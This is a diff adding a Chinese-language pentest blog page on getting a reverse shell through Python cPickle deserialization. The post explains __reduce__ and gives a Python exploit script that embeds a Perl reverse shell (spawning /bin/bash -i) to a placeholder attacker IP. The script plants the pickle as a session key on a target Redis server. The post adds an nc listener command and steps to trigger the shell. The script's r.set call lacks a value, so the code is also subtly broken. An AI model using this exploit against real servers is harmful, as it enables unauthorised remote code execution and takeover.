@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>Python cPickle 反序列化shell</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/python-cpickle-shell.html" rel="bookmark"
+           title="Permalink to Python cPickle 反序列化shell">Python cPickle 反序列化shell</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2016-07-26T00:00:00+02:00">
+                <a href='#'>07/26/2016 </a>
+                <a href="/category/python.html">Python</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
+<blockquote>
+<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
+<p>A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
+</blockquote>
+<p><code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:
+* <a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">import</span> <span class="nn">cPickle</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">redis</span>
+
+<span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot; perl -e &#39;use Socket;$i=&quot;xx.xx.xx.xx&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);}&#39;&quot;&quot;&quot;</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">s</span><span class="p">,))</span>
+
+<span class="n">e</span> <span class="o">=</span> <span class="n">exp</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;xxx.xxx.xxx.xxx&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;</span><span class="p">)</span>
+</pre></div>
+</td></tr></table>
+
+<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。
+反弹shell指定端口 <code>nc -l -vv -p 443</code>
+然后到redis页面设置session_id，刷新之后即可反弹。</p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
